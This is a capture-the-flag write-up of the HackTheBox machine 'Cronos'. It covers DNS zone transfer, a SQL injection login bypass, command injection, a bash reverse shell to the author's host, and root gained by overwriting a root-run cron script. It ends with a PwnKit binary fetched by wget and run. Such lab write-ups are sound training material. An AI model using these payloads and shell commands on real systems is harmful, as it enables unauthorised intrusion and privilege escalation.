---
render_with_liquid: false
title: HackTheBox Writeup  Cronos
date: 2024-01-19 14:25:17 +1400
tags: [hackthebox, nmap, linux, dns, gobuster, feroxbuster, php, auth-bypass, sqli, command-injection, scheduled-job-abuse, php-script, oscp-like, pwnkit]
---



CronOS focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability.


# Recon
---

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Jan 19 14:25:17 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,53,80, Cronos
Nmap scan report for Cronos (10.129.227.211)
Host is up, received user-set (0.31s latency).
Scanned at 2024-01-19 14:25:17 CST for 17s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jan 19 14:25:34 2024 -- 1 IP address (1 host up) scanned in 17.53 seconds
```

## 53 - DNS


### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ dig -x 10.129.227.211 @10.129.227.211
[...]
;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13
[...]
```

Add `cronos.htb` to hosts

### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ dig axfr @cronos.htb cronos.htb

; <<>> DiG 9.19.19-1-Debian <<>> axfr @cronos.htb cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 91 msec
;; SERVER: 10.129.227.211#53(cronos.htb) (TCP)
;; WHEN: Fri Jan 19 14:39:34 CST 2024
;; XFR size: 7 records (messages 1, bytes 203)
```

Add those subdomains to host

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ cat tmp/axfr.txt | grep cronos.htb | sed '/^;/d' | awk -F'. ' '{print $1}' | sort -u | xargs
admin.cronos.htb cronos.htb ns1.cronos.htb www.cronos.htb

┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ pt init '10.129.227.211 Cronos cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb'

+---------+--------+----------------+------------------+
| PROFILE | STATUS |       IP       |      DOMAIN      |
+---------+--------+----------------+------------------+
| cronos  | on     | 10.129.227.211 | Cronos           |
| cronos  | on     | 10.129.227.211 | cronos.htb       |
| cronos  | on     | 10.129.227.211 | admin.cronos.htb |
| cronos  | on     | 10.129.227.211 | ns1.cronos.htb   |
| cronos  | on     | 10.129.227.211 | www.cronos.htb   |
+---------+--------+----------------+------------------+
```


### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ dnsrecon -n cronos.htb -d cronos.htb
[*] std: Performing General Enumeration against: cronos.htb...
[-] DNSSEC is not configured for cronos.htb
[*]      SOA cronos.htb 10.10.10.13
[*]      NS ns1.cronos.htb 10.10.10.13
[*]      A cronos.htb 10.10.10.13
[*] Enumerating SRV Records
[-] No SRV Records Found for cronos.htb
```


### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ gobuster dns -d cronos.htb -r cronos.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     cronos.htb
[+] Threads:    100
[+] Resolver:   cronos.htb
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.cronos.htb

Found: ns1.cronos.htb

Found: admin.cronos.htb

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 80 - HTTP : Apache2 Ubuntu Default Page


### Info

![](/assets/obsidian/8e009e44e96cc7e9db4fa6021670b0ab.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ feroxbuster -k -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -u 'http://cronos/' -o ferox_80.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cronos/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://cronos/icons/ubuntu-logo.png
200      GET      379l      975w    11439c http://cronos/
200      GET      379l      975w    11439c http://cronos/index.html
[####################] - 23s     7253/7253    0s      found:3       errors:0
[#############>------] - 22s     4724/7234    212/s   http://cronos/ 
```

# User Flag
---

# Root Flag
---

## Enumeration


### 80 - www.cronos.htb


#### Info

The links in the site leads user to different external websites about **laravel**

![](/assets/obsidian/bc98d1f952c6e8404d1e82a46beb84f8.png)

#### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ feroxbuster -k -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -C 400,404,500 -u 'http://www.cronos.htb/' -o ferox_80_www.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://www.cronos.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80_www.txt
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       85l      137w     2319c http://www.cronos.htb/
301      GET        9l       28w      314c http://www.cronos.htb/css => http://www.cronos.htb/css/
200      GET        0l        0w        0c http://www.cronos.htb/favicon.ico
200      GET        9l     1270w   118393c http://www.cronos.htb/css/app.css
200      GET       85l      137w     2319c http://www.cronos.htb/index.php
301      GET        9l       28w      313c http://www.cronos.htb/js => http://www.cronos.htb/js/
200      GET        0l        0w   284534c http://www.cronos.htb/js/app.js
200      GET        2l        3w       24c http://www.cronos.htb/robots.txt
200      GET       23l       59w      914c http://www.cronos.htb/web.config
[####################] - 42s    22653/22653   0s      found:9       errors:1
[####################] - 42s    17865/17865   429/s   http://www.cronos.htb/
[####################] - 4s      4724/4724    1198/s  http://www.cronos.htb/css/ => Directory listing
[####################] - 8s      4724/4724    611/s   http://www.cronos.htb/js/ => Directory listing 
```


### 80 - admin.cronos.htb


#### Info

![](/assets/obsidian/5f4a3eba47a6f45ef267831b81314f1c.png)

#### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ feroxbuster -k -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -C 400,404,500 -u 'http://admin.cronos.htb/' -o ferox_80_admin.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.cronos.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80_admin.txt
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       56l      139w     1547c http://admin.cronos.htb/
200      GET       56l      139w     1547c http://admin.cronos.htb/index.php
302      GET        0l        0w        0c http://admin.cronos.htb/logout.php => index.php
302      GET        0l        0w        0c http://admin.cronos.htb/session.php => index.php
302      GET       20l       38w      439c http://admin.cronos.htb/welcome.php => index.php
200      GET        1l        2w     1024c http://admin.cronos.htb/.welcome.php.swp
[####################] - 19s     7277/7277    0s      found:6       errors:0
[####################] - 19s     7246/7246    386/s   http://admin.cronos.htb/ 
```

There was a `swp` file leftover by text editors, nothing interesting inside

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ curl http://admin.cronos.htb/.welcome.php.swp > loot/welcome.php.swp
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1024  100  1024    0     0   4578      0 --:--:-- --:--:-- --:--:--  4571

┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ strings loot/welcome.php.swp
b0nano 2.5.3
root
cronos
/var/www/admin/welcome.php
```


## Shell as www-data


### Auth bypass (SQLI) at admin.cronos.htb

I learnt not to mess database up with `or/and` clauses from [this Tib3rius's Tweet](https://twitter.com/0xTib3rius/status/1624819441044185088)

Payload : `admin'; -- -` (Or use `' or 1=1 LIMIT 1-- -` to avoid retrieving the whole database)

![](/assets/obsidian/2d79f936aa4ba220b41d6ec8627f7560.png)

![](/assets/obsidian/8ebe2299d07e62f7c49efb83dcc0fc1c.png)

### Command injection

![](/assets/obsidian/55d8f3d0b0fd4e9029111f450308e28c.png)

Make it ping my machine

![](/assets/obsidian/81f8a01841f25256e4be4c2026b28a25.png)

Confirmed command execution

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ sudo tcpdump -i tun0 icmp -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:28:07.042568 IP (tos 0x0, ttl 63, id 39750, offset 0, flags [DF], proto ICMP (1), length 84)
    Cronos > fsociety: ICMP echo request, id 1508, seq 1, length 64
15:28:07.042590 IP (tos 0x0, ttl 64, id 28215, offset 0, flags [none], proto ICMP (1), length 84)
    fsociety > Cronos: ICMP echo reply, id 1508, seq 1, length 64
```

Get reverse shell

```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.14.21/1111 0>&1"
```

![](/assets/obsidian/8bb334c654160bb6a7d938dcef82a234.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.54.7] 42258
bash: cannot set terminal process group (1368): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
export TERM=xterm
stty rows 50 columns 209
┌──(bravosec㉿fsociety)-[~/htb/Cronos]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@cronos:/var/www/admin$ stty rows 50 columns 209
www-data@cronos:/var/www/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## From www-data to root


### Enumeration

```bash
www-data@cronos:/var/www/admin$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
```

```bash
www-data@cronos:/var/www/admin$ ls -latr
total 32
-rw-r--r-- 1 www-data www-data  237 Apr  9  2017 config.php
-rw-r--r-- 1 www-data www-data  102 Apr  9  2017 logout.php
-rw-r--r-- 1 www-data www-data  383 Apr  9  2017 session.php
-rw-r--r-- 1 www-data www-data 1024 Apr  9  2017 .welcome.php.swp
-rw-r--r-- 1 www-data www-data  782 Apr  9  2017 welcome.php
-rw-r--r-- 1 www-data www-data 2531 Jan  1  2021 index.php
drwxr-xr-x 5 root     root     4096 May 10  2022 ..
drwxr-xr-x 2 www-data www-data 4096 May 10  2022 .
www-data@cronos:/var/www/admin$ cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

```bash
www-data@cronos:/var/www/admin$ mysql -u admin -p'kEjdbRigfBHUREiNSDs'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use admin
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

The hash is not crackable

```bash
hashcat loot/mysql_admin_users.hash /opt/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best64.rule -m 0
```

No users can password reuse with `kEjdbRigfBHUREiNSDs`

From `cronos.htb`'s **apache** config, I know it's running as `www-data`, so writing a webshell to its web root won't help

```bash
www-data@cronos:/var/www$ cat /etc/apache2/sites-enabled/laravel.conf
<VirtualHost *:80>
ServerAdmin admin@your_domain.com
DocumentRoot /var/www/laravel/public/
ServerName cronos.htb
ServerAlias www.cronos.htb
<Directory /var/www/html/laravel/>
Options FollowSymLinks
AllowOverride All
Order allow,deny
allow from all
</Directory>
ErrorLog /var/log/apache2/chronos.htb-error_log
CustomLog /var/log/apache2/chronos.htb-access_log common
</VirtualHost>
```

```bash
www-data@cronos:/var/www/laravel$ ls -latr
total 2012
[...]
-rwxr-xr-x  1 www-data www-data 1836198 Apr  9  2017 composer.phar
-rw-r--r--  1 www-data www-data  121424 Apr  9  2017 composer.lock
-rw-r--r--  1 www-data www-data     572 Apr  9  2017 .env
drwxr-xr-x  5 www-data www-data    4096 May 10  2022 database
drwxr-xr-x  2 www-data www-data    4096 May 10  2022 config
[...]
drwxr-xr-x  8 www-data www-data    4096 May 10  2022 .git
[...]
```

> **Get laravel's version**
> ```bash
> www-data@cronos:/var/www/laravel$ php artisan -V
> Laravel Framework 5.4.17
> ```
{: .prompt-tip }

### Schedule task abuse

A cron job will run `php /var/www/laravel/artisan` as root

```bash
www-data@cronos:/var/www/laravel$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/* /var/spool/cron/* 2>/dev/null | grep -v "^#"

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

I can write to `artisan`

```bash
www-data@cronos:/var/www/laravel$ ls -la artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan
```

Give bash SUID as root

```bash
www-data@cronos:/var/www/laravel$ cp /bin/bash /tmp/b
www-data@cronos:/var/www/laravel$ mv artisan artisan~
www-data@cronos:/var/www/laravel$ echo -e '<?php system("chmod +s /tmp/b"); ?>' > artisan
```

```bash
www-data@cronos:/var/www/laravel$ ls -la /tmp/b
-rwsr-sr-x 1 root root 1037528 Jan 19 10:37 /tmp/b
www-data@cronos:/var/www/laravel$ /tmp/b -p
b-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
b-4.3# cat /root/root.txt
a124ba3293e5e06f994cea8e4891b12d
```

Get user flag

```bash
b-4.3# find /home -type f -name user.txt -exec bash -c 'echo -n "$0 : "; cat $0' {} \; 2>/dev/null
/home/noulis/user.txt : cc7acc3aaa6f41e9ba9bac5ff0e636c1
```

# Additional
---

## From any to root with Pwnkit

```bash
www-data@cronos:/tmp$ find / -type f -perm -4000 -exec ls -latr {} \; 2>/dev/null
[...]
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
[...]
```

```bash
www-data@cronos:/var/www/laravel$ cd /tmp && wget 10.10.14.21/PwnKit -O pk && chmod +x pk && ./pk
--2024-01-19 10:18:35--  http://10.10.14.21/PwnKit
Connecting to 10.10.14.21:80... rm pk
connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'pk'

pk                                                   100%[===================================================================================================================>]  17.62K  --.-KB/s    in 0.1s

2024-01-19 10:18:36 (172 KB/s) - 'pk' saved [18040/18040]

root@cronos:/tmp# rm pk
root@cronos:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```